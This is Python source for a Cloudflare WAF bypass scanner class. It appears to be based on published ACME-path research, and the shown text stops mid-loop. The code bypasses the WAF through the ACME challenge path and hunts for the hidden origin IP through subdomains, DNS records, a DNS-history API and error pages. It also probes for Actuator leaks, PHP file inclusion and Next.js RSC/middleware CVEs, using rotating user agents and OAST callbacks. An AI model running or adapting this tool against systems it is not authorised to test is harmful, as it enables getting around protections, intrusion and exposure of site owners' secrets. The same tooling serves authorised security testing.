#!/usr/bin/env python3
"""
Cloudflare ACME WAF Bypass Scanner - Main Scanner Class
Based on FearsOff Research: https://fearsoff.org/research/cloudflare-acme
"""

import requests
import random
import string
import time
import re
import socket
import concurrent.futures
from urllib.parse import urlparse
from colorama import Fore, Style

from utils.constants import USER_AGENTS, FRAMEWORK_SIGNATURES
from utils.payloads import (
    ACTUATOR_PAYLOADS, PHP_LFI_PAYLOADS, NEXTJS_PAYLOADS,
    NEXTJS_RSC_RCE_PAYLOADS, NEXTJS_RSC_BYPASS_HEADERS, NEXTJS_RSC_POST_PAYLOADS,
    CF_WAF_BYPASS_PAYLOADS, CF_CACHE_POISON_PAYLOADS, CF_BYPASS_PATHS,
    HOST_HEADER_PAYLOADS, RATE_LIMIT_BYPASS_HEADERS, SENSITIVE_PATHS,
    GRAPHQL_PAYLOADS, BYPASS_HEADERS
)


class CloudflareScanner:
    def __init__(self, timeout=10, threads=10, delay=0, verbose=False, token=None, oast_client=None):
        self.timeout = timeout
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.custom_token = token  # User-provided token
        self.oast_client = oast_client  # OAST client for blind vulnerability detection
        self.session = requests.Session()
        self.results = []
        
    def get_random_ua(self):
        """Get random user agent"""
        return random.choice(USER_AGENTS)
    
    def generate_random_token(self, length=43):
        """Generate random ACME challenge token (similar to original format)"""
        # ACME token format: alphanumeric + dash + underscore
        return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))
    
    def get_token(self):
        """Get token - either custom or generate random"""
        if self.custom_token:
            return self.custom_token
        return self.generate_random_token()
    
    def generate_payloads_with_token(self, payloads, token):
        """Replace {token} placeholder with actual token"""
        return [p.replace("{token}", token) for p in payloads]
    
    def check_cloudflare(self, response):
        """Check if target is using Cloudflare"""
        cf_indicators = {
            'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
            'server': 'cloudflare'
        }
        
        for header in cf_indicators['headers']:
            if header in response.headers:
                return True
        
        server = response.headers.get('server', '').lower()
        if cf_indicators['server'] in server:
            return True
            
        return False
    
    def detect_origin_response(self, cf_response, acme_response):
        """
        Detect if response comes from origin vs Cloudflare
        Key indicator: Cloudflare block page vs Origin framework 404
        """
        # Check if CF response is a block page
        cf_is_block = any(x in cf_response.text.lower() for x in [
            'access denied', 'blocked', 'ray id', 'cloudflare',
            'error 1020', 'error 1015', 'sorry, you have been blocked'
        ])
        
        # Check if ACME response is from origin (framework 404, not CF block)
        origin_indicators = [
            'not found', '404', 'cannot get', 'page not found',
            'whitelabel error', 'resource not found', 'no route'
        ]
        acme_is_origin = any(x in acme_response.text.lower() for x in origin_indicators)
        
        # Different response = WAF bypass confirmed
        if cf_is_block and (acme_response.status_code != cf_response.status_code or acme_is_origin):
            return True
        
        # Check for cf-ray header difference
        cf_has_ray = 'cf-ray' in cf_response.headers
        acme_has_ray = 'cf-ray' in acme_response.headers
        
        # If CF response has cf-ray but ACME doesn't, might indicate origin
        if cf_has_ray and not acme_has_ray:
            return True
            
        return False
    
    def detect_framework(self, response):
        """Detect framework from response"""
        content = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        for framework, signatures in FRAMEWORK_SIGNATURES.items():
            for sig in signatures:
                if sig in content or any(sig in v for v in headers.values()):
                    return framework
        return 'unknown'
    
    def extract_origin_ip(self, target, response):
        """
        Attempt to find real origin server IP from various sources
        """
        origin_ips = []
        parsed = urlparse(target)
        hostname = parsed.hostname
        
        # 1. Check response headers that may leak IP
        ip_leak_headers = [
            'x-served-by', 'x-backend-server', 'x-server-ip', 'x-host',
            'x-forwarded-server', 'x-real-ip', 'x-originating-ip',
            'x-remote-addr', 'x-remote-ip', 'x-backend', 'via',
            'x-azure-ref', 'x-amz-cf-id', 'x-cache', 'x-served-from',
            'x-server', 'x-origin-server', 'x-upstream', 'x-proxy-cache'
        ]
        
        for header in ip_leak_headers:
            if header in response.headers:
                value = response.headers[header]
                # Extract IP from header value
                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                found_ips = re.findall(ip_pattern, value)
                for ip in found_ips:
                    if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                        if ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': ip, 'source': f'Header: {header}'})
        
        # 2. Check response body for IP leak (in error messages, debug info, etc.)
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        body_ips = re.findall(ip_pattern, response.text)
        for ip in body_ips:
            if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                if ip not in [x['ip'] for x in origin_ips]:
                    origin_ips.append({'ip': ip, 'source': 'Response Body'})
        
        # 3. Check common subdomains that may expose origin (not through CF)
        origin_subdomains = [
            f'direct.{hostname}', f'direct-connect.{hostname}',
            f'origin.{hostname}', f'origin-www.{hostname}',
            f'backend.{hostname}', f'server.{hostname}',
            f'real.{hostname}', f'direct-{hostname}',
            f'mail.{hostname}', f'smtp.{hostname}', f'mx.{hostname}',
            f'ftp.{hostname}', f'sftp.{hostname}',
            f'cpanel.{hostname}', f'webmail.{hostname}', 
            f'autodiscover.{hostname}', f'autoconfig.{hostname}',
            f'ns1.{hostname}', f'ns2.{hostname}',
            f'vpn.{hostname}', f'ssh.{hostname}',
            f'staging.{hostname}', f'stage.{hostname}',
            f'dev.{hostname}', f'test.{hostname}',
            f'api.{hostname}', f'api-internal.{hostname}',
            f'admin.{hostname}', f'panel.{hostname}',
            f'old.{hostname}', f'legacy.{hostname}',
        ]
        
        print(f"  {Fore.CYAN}[*] Checking {len(origin_subdomains)} subdomains for origin IP...{Style.RESET_ALL}")
        
        for subdomain in origin_subdomains:
            try:
                ip = socket.gethostbyname(subdomain)
                if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                    if ip not in [x['ip'] for x in origin_ips]:
                        origin_ips.append({'ip': ip, 'source': f'Subdomain: {subdomain}'})
                        print(f"      {Fore.GREEN}[+] Found via {subdomain}: {ip}{Style.RESET_ALL}")
            except socket.gaierror:
                pass
            except Exception:
                pass
        
        # 4. Check MX records - often expose origin IP
        try:
            import subprocess
            result = subprocess.run(['nslookup', '-type=MX', hostname], 
                                   capture_output=True, text=True, timeout=10)
            mx_output = result.stdout
            
            # Parse MX records
            mx_pattern = r'mail exchanger = (?:\d+ )?([^\s]+)'
            mx_servers = re.findall(mx_pattern, mx_output, re.IGNORECASE)
            
            for mx in mx_servers:
                mx = mx.rstrip('.')
                try:
                    mx_ip = socket.gethostbyname(mx)
                    if self.is_valid_public_ip(mx_ip) and not self.is_cloudflare_ip(mx_ip):
                        if mx_ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': mx_ip, 'source': f'MX Record: {mx}'})
                            print(f"      {Fore.GREEN}[+] Found via MX {mx}: {mx_ip}{Style.RESET_ALL}")
                except:
                    pass
        except Exception:
            pass
        
        # 5. Check SPF record for IP ranges
        try:
            import subprocess
            result = subprocess.run(['nslookup', '-type=TXT', hostname], 
                                   capture_output=True, text=True, timeout=10)
            txt_output = result.stdout
            
            # Parse SPF record for IP
            spf_ip_pattern = r'ip4:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            spf_ips = re.findall(spf_ip_pattern, txt_output)
            
            for ip in spf_ips:
                if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                    if ip not in [x['ip'] for x in origin_ips]:
                        origin_ips.append({'ip': ip, 'source': 'SPF Record'})
                        print(f"      {Fore.GREEN}[+] Found via SPF: {ip}{Style.RESET_ALL}")
        except Exception:
            pass
        
        # 6. Check historical DNS via free API (limited)
        try:
            # Try hackertarget.com free API for DNS history
            api_url = f"https://api.hackertarget.com/hostsearch/?q={hostname}"
            resp = self.session.get(api_url, timeout=10, verify=False)
            if resp.status_code == 200 and 'error' not in resp.text.lower():
                lines = resp.text.strip().split('\n')
                for line in lines[:20]:  # Limit
                    if ',' in line:
                        sub, ip = line.split(',', 1)
                        ip = ip.strip()
                        if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                            if ip not in [x['ip'] for x in origin_ips]:
                                origin_ips.append({'ip': ip, 'source': f'DNS History: {sub.strip()}'})
                                print(f"      {Fore.GREEN}[+] Found via DNS history: {ip} ({sub.strip()}){Style.RESET_ALL}")
        except Exception:
            pass
        
        # 7. Try to trigger error page that may leak IP
        error_paths = [
            '/.git/config', '/server-status', '/server-info',
            '/.env', '/debug', '/trace', '/actuator/info',
            '/elmah.axd', '/phpinfo.php', '/info.php'
        ]
        
        for path in error_paths[:5]:
            try:
                err_url = f"{target}{path}"
                err_resp = self.session.get(err_url, headers={'User-Agent': self.get_random_ua()},
                                           timeout=5, verify=False, allow_redirects=False)
                # Search for IP in error response
                found_ips = re.findall(ip_pattern, err_resp.text)
                for ip in found_ips:
                    if self.is_valid_public_ip(ip) and not self.is_cloudflare_ip(ip):
                        if ip not in [x['ip'] for x in origin_ips]:
                            origin_ips.append({'ip': ip, 'source': f'Error page: {path}'})
                            print(f"      {Fore.GREEN}[+] Found in error page {path}: {ip}{Style.RESET_ALL}")
            except:
                pass
        
        return origin_ips
    
    def is_cloudflare_ip(self, ip):
        """Check if IP belongs to Cloudflare range - Updated list"""
        # Cloudflare IP ranges (from https://www.cloudflare.com/ips/)
        cf_ipv4_ranges = [
            # Official Cloudflare ranges
            '173.245.48.', '103.21.244.', '103.22.200.', '103.31.4.',
            '141.101.64.', '141.101.65.', '141.101.66.', '141.101.67.',
            '141.101.68.', '141.101.69.', '141.101.96.', '141.101.97.',
            '141.101.98.', '141.101.99.', '141.101.100.', '141.101.101.',
            '141.101.102.', '141.101.103.', '141.101.104.', '141.101.105.',
            '141.101.106.', '141.101.107.', '141.101.108.', '141.101.109.',
            '141.101.110.', '141.101.111.', '141.101.112.', '141.101.113.',
            '141.101.114.', '141.101.115.', '141.101.116.', '141.101.117.',
            '141.101.118.', '141.101.119.', '141.101.120.', '141.101.121.',
            '108.162.192.', '108.162.193.', '108.162.194.', '108.162.195.',
            '108.162.196.', '108.162.197.', '108.162.198.', '108.162.199.',
            '108.162.200.', '108.162.201.', '108.162.202.', '108.162.203.',
            '108.162.204.', '108.162.205.', '108.162.206.', '108.162.207.',
            '108.162.208.', '108.162.209.', '108.162.210.', '108.162.211.',
            '108.162.212.', '108.162.213.', '108.162.214.', '108.162.215.',
            '108.162.216.', '108.162.217.', '108.162.218.', '108.162.219.',
            '108.162.220.', '108.162.221.', '108.162.222.', '108.162.223.',
            '190.93.240.', '190.93.241.', '190.93.242.', '190.93.243.',
            '190.93.244.', '190.93.245.', '190.93.246.', '190.93.247.',
            '188.114.96.', '188.114.97.', '188.114.98.', '188.114.99.',
            '197.234.240.', '197.234.241.', '197.234.242.', '197.234.243.',
            '198.41.128.', '198.41.129.', '198.41.130.', '198.41.131.',
            '198.41.132.', '198.41.133.', '198.41.134.', '198.41.135.',
            '198.41.136.', '198.41.137.', '198.41.138.', '198.41.139.',
            '198.41.140.', '198.41.141.', '198.41.142.', '198.41.143.',
            '198.41.192.', '198.41.193.', '198.41.194.', '198.41.195.',
            '198.41.196.', '198.41.197.', '198.41.198.', '198.41.199.',
            '198.41.200.', '198.41.201.', '198.41.202.', '198.41.203.',
            '198.41.204.', '198.41.205.', '198.41.206.', '198.41.207.',
            '198.41.208.', '198.41.209.', '198.41.210.', '198.41.211.',
            '198.41.212.', '198.41.213.', '198.41.214.', '198.41.215.',
            '162.158.', '162.159.',
            '104.16.', '104.17.', '104.18.', '104.19.', '104.20.',
            '104.21.', '104.22.', '104.23.', '104.24.', '104.25.',
            '104.26.', '104.27.', '104.28.', '104.29.', '104.30.', '104.31.',
            '172.64.', '172.65.', '172.66.', '172.67.', '172.68.', '172.69.',
            '172.70.', '172.71.',
            '131.0.72.', '131.0.73.', '131.0.74.', '131.0.75.',
            # Additional Cloudflare ranges
            '92.243.74.', '92.243.75.', '92.243.76.', '92.243.77.',
            '199.27.128.', '199.27.129.', '199.27.130.', '199.27.131.',
            '199.27.132.', '199.27.133.', '199.27.134.', '199.27.135.',
        ]
        return any(ip.startswith(prefix) for prefix in cf_ipv4_ranges)
    
    def is_valid_public_ip(self, ip):
        """Check if IP is a valid public IP"""
        try:
            parts = [int(p) for p in ip.split('.')]
            if len(parts) != 4:
                return False
            
            # Exclude private/reserved ranges
            if parts[0] == 10:  # 10.0.0.0/8
                return False
            if parts[0] == 172 and 16 <= parts[1] <= 31:  # 172.16.0.0/12
                return False
            if parts[0] == 192 and parts[1] == 168:  # 192.168.0.0/16
                return False
            if parts[0] == 127:  # localhost
                return False
            if parts[0] == 0 or parts[0] >= 224:  # Reserved
                return False
                
            return True
        except:
            return False
    
    def verify_origin_ip(self, ip, target, token):
        """Verify if IP is origin with direct request"""
        parsed = urlparse(target)
        hostname = parsed.hostname
        
        try:
            # Direct request to IP with Host header
            headers = {
                'User-Agent': self.get_random_ua(),
                'Host': hostname
            }
            
            url = f"https://{ip}/.well-known/acme-challenge/{token}"
            resp = self.session.get(url, headers=headers, timeout=5, 
                                   verify=False, allow_redirects=False)
            
            # If response similar to ACME bypass, likely origin
            if resp.status_code in [200, 301, 302, 404]:
                return True
        except:
            pass
        
        return False
    
    def scan_target(self, target):
        """Scan single target - based on FearsOff research methodology"""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        target = target.rstrip('/')
        results = {
            'target': target,
            'cloudflare': False,
            'waf_bypass': False,
            'framework': 'unknown',
            'findings': [],
            'status': 'unknown'
        }
        
        headers = {'User-Agent': self.get_random_ua()}
        token = self.get_token()
        
        try:
            # Step 1: Initial request to root - baseline
            print(f"\n{Fore.CYAN}[*] Scanning: {target}{Style.RESET_ALL}")
            
            baseline_resp = self.session.get(target, headers=headers, timeout=self.timeout, 
                                            allow_redirects=True, verify=False)
            results['cloudflare'] = self.check_cloudflare(baseline_resp)
            
            cf_status = f"{Fore.YELLOW}[CF Protected]{Style.RESET_ALL}" if results['cloudflare'] else f"{Fore.GREEN}[No CF]{Style.RESET_ALL}"
            print(f"  {cf_status} Baseline Status: {baseline_resp.status_code}")
            
            # Step 2: Test WAF Bypass
            tokens_to_test = [
                token,  # Random token
                'test',  # Simple test
                'ae',   # FearsOff technique
                self.generate_random_token(),  # Another random
            ]
            
            waf_bypassed = False
            successful_token = None
            acme_resp = None
            
            for test_token in tokens_to_test:
                acme_test_url = f"{target}/.well-known/acme-challenge/{test_token}"
                
                if self.delay > 0:
                    time.sleep(self.delay)
                
                try:
                    test_resp = self.session.get(acme_test_url, headers=headers, timeout=self.timeout,
                                                allow_redirects=False, verify=False)
                    
                    if self.detect_origin_response(baseline_resp, test_resp):
                        waf_bypassed = True
                        successful_token = test_token
                        acme_resp = test_resp
                        break
                except:
                    continue
            
            results['waf_bypass'] = waf_bypassed
            
            if waf_bypassed and acme_resp:
                acme_test_url = f"{target}/.well-known/acme-challenge/{successful_token}"
                print(f"  {Fore.RED}[!] WAF BYPASS DETECTED{Style.RESET_ALL} - Origin responding on ACME path!")
                print(f"  {Fore.YELLOW}[*] Successful token: {successful_token}{Style.RESET_ALL}")
                
                # Verify
                verify_token = self.generate_random_token()
                verify_url = f"{target}/.well-known/acme-challenge/{verify_token}"
                try:
                    verify_resp = self.session.get(verify_url, headers=headers, timeout=self.timeout,
                                                  allow_redirects=False, verify=False)
                    if self.detect_origin_response(baseline_resp, verify_resp):
                        print(f"  {Fore.RED}[!] CONFIRMED{Style.RESET_ALL} - Multiple tokens bypass WAF")
                        results['verified'] = True
                    else:
                        print(f"  {Fore.YELLOW}[?] Only specific token works - may be false positive{Style.RESET_ALL}")
                        results['verified'] = False
                except:
                    pass
                
                results['framework'] = self.detect_framework(acme_resp)
                print(f"  {Fore.YELLOW}[*] Detected Framework: {results['framework']}{Style.RESET_ALL}")
                
                # Try to extract origin IP
                print(f"  {Fore.CYAN}[*] Attempting to find Origin IP...{Style.RESET_ALL}")
                origin_ips = self.extract_origin_ip(target, acme_resp)
                
                if acme_resp.status_code in [301, 302, 303, 307, 308]:
                    location = acme_resp.headers.get('location', '')
                    print(f"  {Fore.YELLOW}[*] Redirect detected to: {location[:80]}{Style.RESET_ALL}")
                    
                    if location:
                        try:
                            redirect_resp = self.session.get(location, headers=headers, 
                                                            timeout=self.timeout, verify=False,
                                                            allow_redirects=False)
                            more_ips = self.extract_origin_ip(location, redirect_resp)
                            for ip_info in more_ips:
                                if ip_info['ip'] not in [x['ip'] for x in origin_ips]:
                                    origin_ips.append(ip_info)
                        except:
                            pass
                
                if origin_ips:
                    results['origin_ips'] = origin_ips
                    print(f"  {Fore.GREEN}[+] Potential Origin IP(s) Found:{Style.RESET_ALL}")
                    for ip_info in origin_ips:
                        print(f"      {Fore.RED}→ {ip_info['ip']}{Style.RESET_ALL} (Source: {ip_info['source']})")
                        
                        if self.verify_origin_ip(ip_info['ip'], target, token):
                            ip_info['verified'] = True
                            print(f"        {Fore.GREEN}✓ Verified - Direct connection successful!{Style.RESET_ALL}")
                else:
                    print(f"  {Fore.YELLOW}[-] Could not determine Origin IP from passive methods{Style.RESET_ALL}")
                    print(f"  {Fore.CYAN}[*] Suggestions for finding Origin IP:{Style.RESET_ALL}")
                    print(f"      - SecurityTrails: https://securitytrails.com/domain/{urlparse(target).hostname}/history/a")
                    print(f"      - Censys: https://search.censys.io/search?q={urlparse(target).hostname}")
                    print(f"      - Shodan: https://www.shodan.io/search?query=ssl.cert.subject.cn:{urlparse(target).hostname}")
                    print(f"      - ViewDNS: https://viewdns.info/iphistory/?domain={urlparse(target).hostname}")
                
                results['findings'].append({
                    'type': 'WAF Bypass',
                    'url': acme_test_url,
                    'status_code': acme_resp.status_code,
                    'length': len(acme_resp.content),
                    'token': token,
                    'vulnerable': True,
                    'origin_ips': origin_ips if origin_ips else [],
                    'redirect_location': acme_resp.headers.get('location', None)
                })
            else:
                if self.verbose:
                    print(f"  {Fore.GREEN}[OK]{Style.RESET_ALL} WAF appears to be enforced on ACME path")
            
            # Step 3: Test Spring Boot Actuator
            print(f"  {Fore.CYAN}[*] Testing Spring Boot Actuator endpoints...{Style.RESET_ALL}")
            
            actuator_payloads = self.generate_payloads_with_token(ACTUATOR_PAYLOADS, token)
            for payload in actuator_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        actuator_indicators = [
                            '"status":', '"propertysources":', '"activeprofiles":',
                            '"systemproperties":', '"beans":', '"mappings":',
                            '"health":', '"info":', 'jdbc:', 'datasource'
                        ]
                        
                        if any(ind in content for ind in actuator_indicators):
                            finding = {
                                'type': 'Actuator Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'vulnerable': True
                            }
                            
                            critical_data = ['password', 'secret', 'api.key', 'aws.', 
                                           'private', 'credential', 'token', 'jdbc']
                            if any(c in content for c in critical_data):
                                finding['critical'] = True
                                print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} {url}")
                                print(f"    └── Sensitive data exposed!")
                            else:
                                print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} {url} - Actuator Exposed")
                            
                            results['findings'].append(finding)
                    
                    elif resp.status_code in [401, 403] and self.verbose:
                        print(f"  {Fore.BLUE}[AUTH]{Style.RESET_ALL} {payload.split('/')[-1]} - Protected")
                        
                except requests.RequestException as e:
                    if self.verbose:
                        print(f"  {Fore.RED}[ERR]{Style.RESET_ALL} {str(e)[:50]}")
            
            # Step 4: Test PHP LFI
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing PHP LFI payloads...{Style.RESET_ALL}")
            
            php_payloads = self.generate_payloads_with_token(PHP_LFI_PAYLOADS, token)
            for payload in php_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text
                        
                        lfi_indicators = ['root:', 'daemon:', 'localhost', '[extensions]', 
                                         '[fonts]', 'win.ini', 'boot.ini', '/bin/bash']
                        
                        if any(ind in content for ind in lfi_indicators):
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} {url}")
                            print(f"    └── LFI Confirmed!")
                            
                            results['findings'].append({
                                'type': 'LFI',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'vulnerable': True,
                                'critical': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 5: Test Next.js / SSR
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing Next.js/SSR endpoints...{Style.RESET_ALL}")
            
            nextjs_payloads = self.generate_payloads_with_token(NEXTJS_PAYLOADS, token)
            for payload in nextjs_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        if any(x in content for x in ['__next_data__', 'pageprops', 'initialprops']):
                            print(f"  {Fore.YELLOW}[INFO]{Style.RESET_ALL} {url} - SSR Data Found")
                            
                            results['findings'].append({
                                'type': 'SSR Data Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'interesting': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 5.1: Test Next.js RSC RCE (CVE-2024-34351, CVE-2025-55182, CVE-2025-66478)
            print(f"  {Fore.CYAN}[*] Testing Next.js RSC/RCE vulnerabilities (CVE-2024-34351, CVE-2025-55182, CVE-2025-66478)...{Style.RESET_ALL}")
            
            # Test RSC payloads with bypass headers
            nextjs_rsc_payloads = self.generate_payloads_with_token(NEXTJS_RSC_RCE_PAYLOADS, token)
            
            for bypass_header in NEXTJS_RSC_BYPASS_HEADERS:
                for payload in nextjs_rsc_payloads:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    url = target + payload
                    test_headers = headers.copy()
                    test_headers.update(bypass_header)
                    
                    try:
                        resp = self.session.get(url, headers=test_headers, timeout=self.timeout,
                                               allow_redirects=False, verify=False)
                        
                        content = resp.text.lower()
                        content_type = resp.headers.get('content-type', '').lower()
                        
                        # Check for RSC/RCE indicators
                        rce_indicators = [
                            # Server Action responses
                            '__next_action', 'next-action', 'server action',
                            # Internal data exposure
                            'internal server error', 'middleware', 'x-middleware',
                            # Source/config leak
                            'webpack', 'module.exports', 'process.env',
                            'api_key', 'secret', 'password', 'token',
                            # File system leak
                            '/app/', '/pages/', '/src/', 'node_modules',
                            # RSC Flight data
                            '$undefined', '$l', '$@',
                        ]
                        
                        # CVE-2025-55182: RSC Streaming indicators
                        rsc_stream_indicators = [
                            'text/x-component', 'application/octet-stream',
                            '$sreact.suspense', 'react.suspense',
                            '__flight__', '_rsc', '.rsc',
                            'async-boundary', 'suspense-boundary',
                        ]
                        
                        # CVE-2025-66478: Server Actions Deserialization indicators
                        deser_indicators = [
                            'server-reference-manifest', 'action-id',
                            'server-action', '__server_action__',
                            'form-action', 'action-encrypted',
                            'closure-id', 'bound-args',
                        ]
                        
                        vuln_indicators = [
                            # Direct code execution signs
                            'rce', 'command', 'exec', 'spawn', 'eval',
                            # SSRF success
                            'localhost', '127.0.0.1', '169.254.169.254',
                            # Middleware bypass success
                            'bypassed', 'middleware skipped',
                            # Deserialization success
                            '__proto__', 'prototype', 'constructor',
                        ]
                        
                        # Detect CVE type based on indicators and headers
                        detected_cve = 'CVE-2024-34351'  # default
                        
                        if any(ind in content for ind in rsc_stream_indicators) or 'text/x-component' in content_type:
                            detected_cve = 'CVE-2025-55182'
                        elif any(ind in content for ind in deser_indicators) or any(h in str(bypass_header).lower() for h in ['action', 'server-action']):
                            detected_cve = 'CVE-2025-66478'
                        
                        # Check for middleware bypass success
                        middleware_bypassed = (
                            resp.status_code == 200 and 
                            'x-middleware-subrequest' in str(bypass_header) and
                            baseline_resp.status_code in [401, 403, 404]
                        )
                        
                        if middleware_bypassed:
                            header_name = ', '.join(f"{k}={v}" for k, v in bypass_header.items())
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Next.js Middleware Bypass ({detected_cve})!")
                            print(f"    └── URL: {url[:80]}")
                            print(f"    └── Header: {header_name}")
                            
                            results['findings'].append({
                                'type': 'Next.js RSC Middleware Bypass',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'bypass_header': bypass_header,
                                'vulnerable': True,
                                'critical': True,
                                'cve': detected_cve
                            })
                        
                        # Check for RSC Streaming RCE (CVE-2025-55182)
                        elif 'text/x-component' in content_type or any(ind in content for ind in rsc_stream_indicators):
                            if resp.status_code == 200:
                                print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Next.js RSC Streaming Exposed (CVE-2025-55182)!")
                                print(f"    └── URL: {url[:80]}")
                                print(f"    └── Content-Type: {content_type}")
                                
                                results['findings'].append({
                                    'type': 'Next.js RSC Streaming RCE',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'length': len(resp.content),
                                    'content_type': content_type,
                                    'vulnerable': True,
                                    'critical': True,
                                    'cve': 'CVE-2025-55182'
                                })
                        
                        # Check for Server Actions Deserialization (CVE-2025-66478)
                        elif any(ind in content for ind in deser_indicators):
                            if resp.status_code == 200:
                                found_deser = [ind for ind in deser_indicators if ind in content]
                                print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Next.js Server Actions Exposed (CVE-2025-66478)!")
                                print(f"    └── URL: {url[:80]}")
                                print(f"    └── Indicators: {', '.join(found_deser[:3])}")
                                
                                results['findings'].append({
                                    'type': 'Next.js Server Actions Deserialization',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'length': len(resp.content),
                                    'indicators': found_deser,
                                    'vulnerable': True,
                                    'critical': True,
                                    'cve': 'CVE-2025-66478'
                                })
                        
                        # Check for sensitive data exposure
                        elif resp.status_code == 200:
                            found_indicators = [ind for ind in rce_indicators if ind in content]
                            
                            if found_indicators:
                                severity = 'CRITICAL' if any(v in content for v in vuln_indicators) else 'HIGH'
                                header_name = ', '.join(f"{k}={v}" for k, v in bypass_header.items())
                                
                                print(f"  {Fore.RED}[{severity}]{Style.RESET_ALL} Next.js RSC Data Exposure ({detected_cve})")
                                print(f"    └── URL: {url[:80]}")
                                print(f"    └── Indicators: {', '.join(found_indicators[:3])}")
                                
                                results['findings'].append({
                                    'type': 'Next.js RSC RCE',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'length': len(resp.content),
                                    'bypass_header': bypass_header,
                                    'indicators': found_indicators,
                                    'vulnerable': True,
                                    'critical': severity == 'CRITICAL',
                                    'cve': detected_cve
                                })
                        
                        # Check for source map exposure (info disclosure)
                        elif '.map' in payload and resp.status_code == 200:
                            if 'sourcescontent' in content or 'mappings' in content:
                                print(f"  {Fore.YELLOW}[HIGH]{Style.RESET_ALL} Source Map Exposed: {url[:60]}...")
                                
                                results['findings'].append({
                                    'type': 'Next.js Source Map Exposure',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'length': len(resp.content),
                                    'vulnerable': True
                                })
                                
                    except requests.RequestException:
                        pass
            
            # Test POST-based Server Actions
            for post_payload in NEXTJS_RSC_POST_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                url = target + post_payload['path']
                post_headers = headers.copy()
                post_headers.update(post_payload['headers'])
                
                # Replace callback placeholder if OAST is enabled
                body = post_payload.get('body')
                if body and self.oast_client:
                    callback_url = self.oast_client.get_callback_url('nextjs-rsc')
                    body = body.replace('{callback}', callback_url)
                
                try:
                    if body:
                        resp = self.session.post(url, headers=post_headers, data=body,
                                                timeout=self.timeout, allow_redirects=False, verify=False)
                    else:
                        resp = self.session.get(url, headers=post_headers,
                                               timeout=self.timeout, allow_redirects=False, verify=False)
                    
                    # Check for Server Action response
                    if resp.status_code == 200:
                        content_type = resp.headers.get('content-type', '')
                        
                        if 'text/x-component' in content_type or any(x in resp.text for x in ['$', 'undefined']):
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Next.js Server Action accessible!")
                            print(f"    └── URL: {url}")
                            
                            results['findings'].append({
                                'type': 'Next.js Server Action RCE',
                                'url': url,
                                'status_code': resp.status_code,
                                'content_type': content_type,
                                'method': 'POST' if body else 'GET',
                                'vulnerable': True,
                                'critical': True,
                                'cve': 'CVE-2024-34351'
                            })
                            
                except requests.RequestException:
                    pass
            
            # Step 6: Test header bypass
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing header-based WAF bypass...{Style.RESET_ALL}")
            
            for bypass_header in BYPASS_HEADERS:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                test_headers = headers.copy()
                test_headers.update(bypass_header)
                header_name = list(bypass_header.keys())[0]
                
                acme_url = f"{target}/.well-known/acme-challenge/{token}"
                
                try:
                    resp = self.session.get(acme_url, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200 and len(resp.content) > 100:
                        if self.verbose:
                            print(f"  {Fore.GREEN}[BYPASS]{Style.RESET_ALL} Header: {header_name}")
                        
                        results['findings'].append({
                            'type': 'Header Bypass',
                            'url': acme_url,
                            'status_code': resp.status_code,
                            'header': header_name,
                            'interesting': True
                        })
                        
                except requests.RequestException:
                    pass
            
            # Step 7: Test Cloudflare WAF Bypass payloads
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing Cloudflare WAF bypass techniques...{Style.RESET_ALL}")
            
            for payload in CF_WAF_BYPASS_PAYLOADS:
                if self.delay > 0:
